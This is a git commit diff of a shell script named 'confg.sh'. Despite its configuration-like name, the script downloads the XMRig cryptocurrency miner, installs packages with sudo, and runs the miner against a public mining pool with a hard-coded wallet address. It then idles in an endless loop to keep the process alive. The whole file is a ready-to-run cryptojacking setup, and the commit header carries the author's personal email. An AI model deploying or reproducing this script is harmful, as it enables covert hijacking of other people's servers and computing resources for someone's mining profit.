abf28efc28e4cf205ba2ff6539bbc21982a09464
Vinay Kumar Mogulluru <vinayeim@gmail.com>
2021-10-19 20:13:03 +0530

    Update confg.sh

--- confg.sh
+++ confg.sh
@@ -1,5 +1,11 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
-tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
-ls
-cd xmrig-6.15.0
-./xmrig -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u SHIB:0xc3ADB07132C1672F7DAc8BAAF81e12A47076dD42.eim#7v5a-do2f
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
+tar xf xmrig-6.14.0-linux-x64.tar.gz
+cd xmrig-6.14.0
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:0xc3ADB07132C1672F7DAc8BAAF81e12A47076dD42.eim#7v5a-do2f -p x --cpu 4
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
